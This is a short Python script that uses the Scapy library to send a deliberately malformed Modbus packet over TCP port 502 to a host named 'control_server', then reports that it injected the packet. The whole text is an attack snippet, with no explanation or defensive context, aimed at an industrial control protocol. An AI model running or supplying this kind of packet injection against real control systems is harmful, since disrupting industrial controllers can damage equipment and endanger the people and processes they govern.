from scapy.all import IP, TCP, Raw, send

pkt = IP(dst="control_server")/TCP(dport=502)/Raw(load=b"\x00\x01\xff\xff")
send(pkt)
print("Injected malformed Modbus packet")